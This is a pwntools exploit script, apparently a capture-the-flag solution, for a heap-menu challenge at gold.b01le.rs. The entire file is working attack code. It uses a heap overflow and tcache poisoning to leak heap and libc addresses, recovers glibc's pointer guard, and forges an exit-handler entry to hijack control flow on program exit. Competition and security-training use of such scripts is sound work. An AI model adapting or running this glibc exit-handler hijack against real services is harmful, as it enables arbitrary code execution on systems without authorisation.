from pwn import *

def eat_menu(p):
    p.readuntil('Resize---')
def alloc(idx, size):
    p.sendline(b'1')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.readuntil(b"size? ")
    p.sendline(str(size))
def clear(idx):
    p.sendline(b'2')
    print(p.readline())
    p.readuntil("Where?")
    p.sendline(str(idx))
    eat_menu(p)
def view(idx):
    p.sendline('3')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    return p.readuntil(b'\n')

def edit(idx, size, content):
    p.sendline('4')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.send(content)
def realloc(idx, size):
    p.sendline('6')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.readuntil(b"size? ")
    p.sendline(str(size))

def leak_win():
    p.sendline('7')
    p.readuntil('Address: ')
    return p.readuntil('\n').strip(b'\n')


# stolen from https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
# and from https://ctftime.org/writeup/34804
ror = lambda val, r_bits, max_bits: \
            ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
                (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

rol = lambda val, r_bits, max_bits: \
            (val << r_bits%max_bits) & (2**max_bits-1) | \
                ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

### CHANGEME for real world use
p = remote('gold.b01le.rs', 4002)
#p  = remote('127.0.0.1', 4401)
#p = process(["/tmp/ld-2.36.so", "./chal"])
#gdb.attach(p)
alloc(0, 0x18)


alloc(1, 0x18)
alloc(2, 0x18)
alloc(3, 0x18)
edit(0, 0x18, b'A'*0x19)
p.readline()
clear(1)
clear(3)
heap = u64(view(3)[0:5] + b'\x00'*3) << 12
target = u64(b'\x41'*8)
padding =  b'A'*0x18 + p64(0x20)
clear(2)
# poisoned chunk is at heap + 0x2e0
alloc(4, 0x38)

for i in range(5, 13):
    alloc(i, 0x200)
alloc(14, 0x200)
for i in range(5, 13):
    clear(i)

# libc = 0x1d1ec0
alloc(15, 0x180)
libc = u64(view(15)[0:6] + b'\x00'*2) - 0x1d1ec0
init = libc+0x1d32e0  # avoid clobbering the original handler, which we need

value = p64(((heap + 0x2e0) >> 12) ^ init)
_dl_fini = libc+0x1ec8f0
edit(4, len(value) + len(padding) , padding+value)
p.readline()
alloc(16, 0x18) 
alloc(17, 0x18) # victim
edit(17, 0x18, '\x41'*0x18)
p.readline()

leak = view(17)[0x18:].strip(b'\n')

print('leaking ptr guard')

ptr_guard = ror (u64(leak), 0x11, 64) ^ _dl_fini

win_func = int(leak_win()[2:],16)

fake_exit_func = rol(win_func ^ ptr_guard, 0x11,64)
win = p64(0) + p64(0x1) + p64(0x4) + p64(fake_exit_func)
check = rol(_dl_fini ^ ptr_guard, 0x11, 64)
edit(17, 0x20, win)
log.info("libc @ " + str(hex(libc)))
log.info("leak -> " + str(hex(u64(leak))))
log.info("Heap @ " + str(hex(heap)))
log.info("_dl_fini @ " + str(hex(_dl_fini)))
log.info("Win @ " + str(hex(win_func)))
log.info("PTR guard -> " + str(hex(ptr_guard)))
log.info("Fake exit func -> " + str(hex(fake_exit_func)))
log.info("Check value -> " + str(hex(check)))
### fixup heap so we don't have problems 
### in dl_resolve
'''
for i in range(18,  22):
    alloc(i, 0x18)
for i in range(18, 22):
    clear(i)
'''

print('exiting')
p.sendline('5')
#print(p.readline())
p.interactive()


